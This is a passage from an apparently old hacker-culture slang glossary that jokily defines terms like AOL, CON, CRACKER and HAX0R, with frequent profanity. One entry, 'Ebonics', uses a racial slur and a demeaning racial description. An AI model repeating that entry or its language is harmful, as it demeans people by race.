             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour <sic> also wigger

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
